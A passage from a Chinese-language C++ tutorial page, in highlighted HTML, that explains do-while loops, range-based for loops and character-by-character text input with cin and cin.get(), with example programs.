&gt;&gt; number;</span><br><span class="line">        <span class="keyword">if</span> (number &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input. Please try again.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (number &lt;= <span class="number">0</span>); <span class="comment">// 条件在输入之后检查</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered the positive number: &quot;</span> &lt;&lt; number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较: 如果使用 while，需要先获取一次输入</span></span><br><span class="line">    <span class="comment">// int number_while;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;\nEnter a positive number (using while): &quot;;</span></span><br><span class="line">    <span class="comment">// std::cin &gt;&gt; number_while;</span></span><br><span class="line">    <span class="comment">// while (number_while &lt;= 0) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; &quot;Invalid input. Please try again.&quot; &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; &quot;Enter a positive number (using while): &quot;;</span></span><br><span class="line">    <span class="comment">//     std::cin &gt;&gt; number_while;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; number_while &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 即使条件初始为 false，循环体也执行一次</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nStarting do-while with count = 5 (condition count &lt; 5 is false):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Inside do-while loop, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 这行会执行</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (count &lt; <span class="number">5</span>); <span class="comment">// 第一次检查时 count 是 6, 条件为 false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After do-while loop, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// count 变为 6</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>与 <code>while</code> 和 <code>for</code> 的比较:</strong></p><ul><li>  <strong><code>while</code>:</strong> 入口条件，可能一次都不执行。</li><li>  <strong><code>for</code>:</strong> 通常用于计数或已知迭代次数，结构包含初始化、条件、更新。</li><li>  <strong><code>do while</code>:</strong> 出口条件，保证至少执行一次。</li></ul><p>根据循环逻辑选择最合适的循环结构可以使代码更清晰、更易于理解。如果需要确保操作至少发生一次（如菜单选择、输入验证），<code>do while</code> 是一个很好的选择。</p><h2 id="5-4-基于范围的for循环（C-11）"><a href="#5-4-基于范围的for循环（C-11）" class="headerlink" title="5.4 基于范围的for循环（C++11）"></a>5.4 基于范围的for循环（C++11）</h2><p>C++11 引入了一种更简洁、更易读的 <code>for</code> 循环语法，称为<strong>基于范围的 for 循环 (Range-Based for Loop)</strong> 或 <strong>增强 for 循环 (Enhanced for Loop)**。它专门用于</strong>遍历一个序列（或范围）中的所有元素**，例如数组、STL 容器（如 <code>vector</code>, <code>array</code>, <code>string</code>）、初始化列表等。</p><p><strong>目的:</strong> 简化遍历操作，减少手动管理索引或迭代器的代码，避免常见的差一错误 (off-by-one errors)。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (declaration : range_expression) &#123;</span><br><span class="line">    <span class="comment">// 循环体</span></span><br><span class="line">    <span class="comment">// 使用 declaration 访问当前元素</span></span><br><span class="line">    statement;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><code>declaration</code></strong>: 声明一个变量，其类型应与 <code>range_expression</code> 中元素的类型兼容（或可以转换）。在每次循环迭代中，该变量会被初始化为范围中的当前元素。<ul><li>  通常使用 <code>auto</code> 让编译器自动推断类型。</li><li>  <code>auto variable</code>: <code>variable</code> 会成为当前元素的<strong>副本</strong>。修改 <code>variable</code> 不会影响原始序列中的元素。</li><li>  <code>auto&amp; variable</code>: <code>variable</code> 会成为当前元素的<strong>引用</strong>。修改 <code>variable</code> <strong>会</strong>修改原始序列中的元素。用于需要修改元素或避免复制大型对象开销的情况。</li><li>  <code>const auto&amp; variable</code>: <code>variable</code> 会成为当前元素的<strong>常量引用</strong>。不能通过 <code>variable</code> 修改元素，但可以避免复制开销。用于只读访问。</li></ul></li><li>  <strong><code>:</code></strong>: 用于分隔声明和范围表达式。</li><li><strong><code>range_expression</code></strong>: 一个可以表示序列的表达式。这通常是：<ul><li>  数组名。</li><li>  STL 容器对象（如 <code>std::vector</code>, <code>std::array</code>, <code>std::string</code>, <code>std::list</code> 等）。</li><li>  初始化列表 <code>&#123; ... &#125;</code>。</li><li>  任何定义了 <code>begin()</code> 和 <code>end()</code> 成员函数或可以通过全局 <code>begin()</code> 和 <code>end()</code> 函数获取迭代器的对象。</li></ul></li></ul><p><strong>执行流程:</strong></p><p>循环会自动遍历 <code>range_expression</code> 中的每一个元素。在每次迭代中：</p><ol><li> 从序列中获取下一个元素。</li><li> 将该元素的值（或引用）赋给 <code>declaration</code> 中声明的变量。</li><li> 执行循环体。</li><li> 重复此过程，直到遍历完序列中的所有元素。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt; // 为了 std::array</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 遍历数组</span></span><br><span class="line">    <span class="keyword">double</span> prices[] = &#123;<span class="number">19.99</span>, <span class="number">25.50</span>, <span class="number">9.75</span>, <span class="number">100.0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Prices (array):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> price : prices) &#123; <span class="comment">// price 是每个元素的副本</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 遍历 std::vector</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers (vector):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : numbers) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 遍历 std::string</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Characters (string):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : message) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 遍历初始化列表</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initializer list:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 使用 auto 简化声明</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, 3&gt; fruits &#123;<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Cherry&quot;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fruits (array with auto):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> fruit : fruits) &#123; <span class="comment">// fruit 是 std::string 的副本</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; fruit;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 使用引用修改元素 (auto&amp;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; scores = &#123;<span class="number">70</span>, <span class="number">85</span>, <span class="number">90</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original scores:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> score : scores) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; score;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; score_ref : scores) &#123; <span class="comment">// score_ref 是元素的引用</span></span><br><span class="line">        score_ref += <span class="number">5</span>; <span class="comment">// 给每个分数加 5</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scores after adding 5:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> score : scores) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; score; <span class="comment">// 输出修改后的分数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 使用常量引用进行只读访问 (const auto&amp;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reading scores (const auto&amp;):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; score_cref : scores) &#123;</span><br><span class="line">        <span class="comment">// score_cref += 1; // 错误! 不能通过常量引用修改</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; score_cref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优点:</strong></p><ul><li>  <strong>简洁:</strong> 代码更短，意图更清晰（“对范围中的每个元素做某事”）。</li><li>  <strong>安全:</strong> 避免了手动管理索引或迭代器可能导致的错误（如越界访问、迭代器失效等）。</li><li>  <strong>通用:</strong> 适用于所有定义了 <code>begin()</code> 和 <code>end()</code> 的标准容器以及内置数组和初始化列表。</li></ul><p><strong>局限性:</strong></p><ul><li><strong>无法直接获取索引:</strong> 如果在循环中需要知道当前元素的索引，基于范围的 for 循环本身不提供这个信息。需要额外维护一个计数器变量。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> val : data) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Index &quot;</span> &lt;&lt; index &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    index++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>  <strong>遍历整个范围:</strong> 它总是从头到尾遍历整个范围。如果需要更复杂的遍历模式（如反向、跳跃、只遍历部分范围），传统的 <code>for</code> 循环或 <code>while</code> 循环配合迭代器可能更合适。</li><li>  <strong>修改容器大小:</strong> 在循环体内修改容器的大小（例如，在 <code>vector</code> 中 <code>push_back</code> 或 <code>erase</code>）通常是不安全的，可能导致迭代器失效和未定义行为。基于范围的 for 循环不适合这种情况。</li></ul><p><strong>总结:</strong></p><p>基于范围的 <code>for</code> 循环是 C++11 提供的一个非常有用的特性，极大地简化了对序列中所有元素的遍历操作。在不需要索引且需要遍历整个序列的情况下，它通常是比传统 <code>for</code> 循环更优选、更安全、更易读的选择。</p><h2 id="5-5-循环和文本输入"><a href="#5-5-循环和文本输入" class="headerlink" title="5.5 循环和文本输入"></a>5.5 循环和文本输入</h2><p>循环结构在处理文本输入时非常有用，特别是当我们需要逐个字符或逐行读取数据，直到满足某个条件（如遇到特定字符、文件结束或达到一定数量）时。本节将探讨使用 <code>cin</code> 及其相关方法进行文本输入的常见模式和技巧。</p><h3 id="5-5-1-使用原始的cin进行输入"><a href="#5-5-1-使用原始的cin进行输入" class="headerlink" title="5.5.1 使用原始的cin进行输入"></a>5.5.1 使用原始的cin进行输入</h3><p>我们已经知道，使用 <code>cin &gt;&gt; variable</code> 可以从标准输入读取数据。当用于读取文本（如 <code>char</code> 或 <code>string</code>）时，<code>cin &gt;&gt;</code> 的行为特点是：</p><ol><li> <strong>跳过空白:</strong> 它会自动忽略输入流中开头的任何空白字符（空格、制表符、换行符）。</li><li> <strong>读取直到空白:</strong> 它会读取非空白字符，直到遇到下一个空白字符为止。</li><li> <strong>空白符留在流中:</strong> 停止读取时遇到的那个空白字符会<strong>留在</strong>输入流（输入缓冲区）中，等待下一次读取操作。</li></ol><p>这使得 <code>cin &gt;&gt;</code> 适合读取单个单词或以空白分隔的数据项，但不适合读取包含空格的整行文本或精确地逐个字符处理（包括空格）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter some characters (e.g., &#x27;a b c&#x27;): &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取第一个非空白字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; ch; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char read: &#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 如果输入 &quot;  a b c&quot;, 这里会读到 &#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取下一个单词</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next word read: \&quot;&quot;</span> &lt;&lt; word &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 会读到 &quot;b&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次读取字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; ch;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next char read: &#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 会读到 &#x27;c&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取单词直到输入结束 (例如按 Ctrl+Z/Ctrl+D)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter words (Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word) &#123; <span class="comment">// cin &gt;&gt; word 在成功读取时返回 true</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read word: &quot;</span> &lt;&lt; word &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注意：循环结束后，cin 可能处于失败状态</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>while (std::cin &gt;&gt; word)</code> 是一种常见的读取模式，它利用了 <code>cin</code> 对象在成功读取时可以被转换为 <code>true</code> 的特性。当读取失败（例如到达文件末尾或遇到无效输入）时，<code>cin</code> 对象会转换为 <code>false</code>，循环终止。</p><h3 id="5-5-2-使用cin-get-char-进行补救"><a href="#5-5-2-使用cin-get-char-进行补救" class="headerlink" title="5.5.2 使用cin.get(char)进行补救"></a>5.5.2 使用cin.get(char)进行补救</h3><p><code>cin &gt;&gt;</code> 跳过空白并停止于空白的行为有时不是我们想要的，特别是当我们需要读取包括空格在内的每一个字符时。<code>cin.get(char&amp; ch)</code> 成员函数提供了解决方案。</p><ul><li><code>cin.get(char&amp; ch)</code>:<ul><li>  尝试从输入流中读取<strong>下一个</strong>字符（无论它是什么，包括空格、制表符、换行符）。</li><li>  如果成功读取，将该字符存储在参数 <code>ch</code> 中，并返回 <code>cin</code> 对象本身（可以转换为 <code>true</code>）。</li><li>  如果到达文件末尾或发生错误，不修改 <code>ch</code>，并将 <code>cin</code> 置于失败状态（转换为 <code>false</code>）。</li></ul></li></ul><p>这使得 <code>cin.get(char)</code> 非常适合在循环中逐个读取所有字符。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter text (Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取每一个字符，包括空白符</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.get(ch)) &#123; <span class="comment">// 尝试读取一个字符到 ch</span></span><br><span class="line">        <span class="comment">// 成功读取，处理字符 ch</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; ch; <span class="comment">// 逐个字符回显</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- End of input ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total characters read: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个循环会读取并回显用户输入的所有字符，包括空格和换行，直到遇到文件结束符。</p><h3 id="5-5-3-使用哪个cin-get"><a href="#5-5-3-使用哪个cin-get" class="headerlink" title="5.5.3 使用哪个cin.get()"></a>5.5.3 使用哪个cin.get()</h3><p><code>istream</code> 类（<code>cin</code> 是其对象）实际上提供了几个名为 <code>get</code> 的成员函数（函数重载）：</p><ol><li><p><strong><code>cin.get(char&amp; ch)</code>:</strong> (已在 5.5.2 讨论)</p><ul><li>  读取下一个字符到参数 <code>ch</code> 中。</li><li>  返回 <code>cin</code> 对象。</li><li>  适合在 <code>while</code> 条件中直接使用 <code>while(cin.get(ch))</code>。</li></ul></li><li><p><strong><code>cin.get()</code>:</strong> (无参数版本)</p><ul><li>  读取下一个字符。</li><li>  返回该字符的<strong>整数</strong> ASCII 码（或 <code>wchar_t</code> 对应的值）。</li><li>  如果到达文件末尾或发生错误，返回特殊值 <code>EOF</code> (End Of File，通常定义为 -1，在 <code>&lt;iostream&gt;</code> 或 <code>&lt;cstdio&gt;</code> 中定义)。</li><li>  不直接将字符存入变量，需要接收其返回值。</li></ul></li></ol><p><strong>选择依据:</strong></p><ul><li>  <strong><code>cin.get(char&amp; ch)</code>:</strong> 当你需要将读取的字符直接存储到一个 <code>char</code> 变量中，并且想利用 <code>cin</code> 对象在 <code>while</code> 条件中的布尔转换特性时，这是最常用的选择。</li><li>  <strong><code>cin.get()</code> (无参数):</strong> 当你需要显式地检查文件结束符 <code>EOF</code> 时，或者当你需要获取字符的整数值时，这个版本更合适。返回值需要与 <code>EOF</code> 进行比较。</li></ul><p><strong>用法与示例 (cin.get() 无参数版本):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt; // 为了 EOF (虽然 iostream 通常也包含)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ch_int; <span class="comment">// 注意类型是 int，以接收 EOF</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter text (Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取，直到遇到 EOF</span></span><br><span class="line">    <span class="keyword">while</span> ((ch_int = <span class="built_in">std</span>::<span class="built_in">cin</span>.get()) != EOF) &#123; <span class="comment">// 读取字符的 int 值并与 EOF 比较</span></span><br><span class="line">        <span class="comment">// 成功读取 (不是 EOF)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(ch_int); <span class="comment">// 将 int 值转回 char 